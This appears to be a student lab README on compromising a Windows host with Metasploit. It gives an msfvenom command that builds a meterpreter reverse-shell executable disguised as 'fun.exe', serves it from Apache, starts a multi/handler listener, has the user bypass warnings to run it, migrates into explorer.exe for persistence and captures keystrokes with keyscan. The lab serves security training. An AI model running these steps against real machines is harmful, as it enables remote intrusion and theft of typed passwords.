# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

### PROGRAM:
Find the attackers ip address using ifconfig
#### OUTPUT:

![Screenshot 2025-04-07 105134](https://github.com/user-attachments/assets/e2500488-3f5b-4c30-b9b4-bf51a07927ad)


Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
#### OUTPUT

![Screenshot 2025-04-07 105158](https://github.com/user-attachments/assets/9e750d89-8ae7-4f7c-92ed-3893b710ae20)

copy the fun.exe into the apache /var/www/html folder
![Screenshot 2025-04-07 110804](https://github.com/user-attachments/assets/3ff847bb-f818-4291-a8b6-03464bde5cb2)


Start apache server
sudo systemctl apache2 start
![Screenshot 2025-04-07 105238](https://github.com/user-attachments/assets/e8a4a737-b511-4415-b7f1-c408ed5db76a)


Check the status of apache2

![Screenshot 2025-04-07 105256](https://github.com/user-attachments/assets/54e60191-b3bc-47e4-ae4c-9756ed968711)


Invoke msfconsole:
## OUTPUT:
![Screenshot 2025-04-07 105314](https://github.com/user-attachments/assets/cb00ab80-dfdd-45a7-bffa-6c60aac4f457)

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
![Screenshot 2025-04-07 111200](https://github.com/user-attachments/assets/70814520-7a08-41aa-96c6-516ce618103e)


Starting a command and control Server
use multi/handler
![Screenshot 2025-04-07 105348](https://github.com/user-attachments/assets/dcd808fe-8ada-4718-a016-bd300ff59cb3)

set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.220.129/fun.exe
The file "fun.exe" downloads. 
![Screenshot 2025-04-07 104633](https://github.com/user-attachments/assets/e49015da-642f-42c7-a65b-95fb50607186)


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![Screenshot 2025-04-07 105348](https://github.com/user-attachments/assets/9e1bddfb-a717-45c3-8600-623bc5f7eecd)

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

![Screenshot 2025-04-07 105412](https://github.com/user-attachments/assets/a0514241-7ee8-4add-9aa0-23e9cab64e98)

![Screenshot 2025-04-07 104729](https://github.com/user-attachments/assets/198c16ca-e2d4-4267-b7b7-a225f771f9fa)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
![Screenshot 2025-04-07 112147](https://github.com/user-attachments/assets/01f0e0a6-1033-4cbf-938f-8d3db3099bde)


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![Screenshot 2025-04-07 112333](https://github.com/user-attachments/assets/e12db1cf-bc7b-4e67-a3d2-c4a1112f7801)

keyscan_dump	Shows the keystrokes captured so far

![Screenshot 2025-04-07 105459](https://github.com/user-attachments/assets/6f268428-e4af-45b3-83f2-f7c8a5bbc8a9)







## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
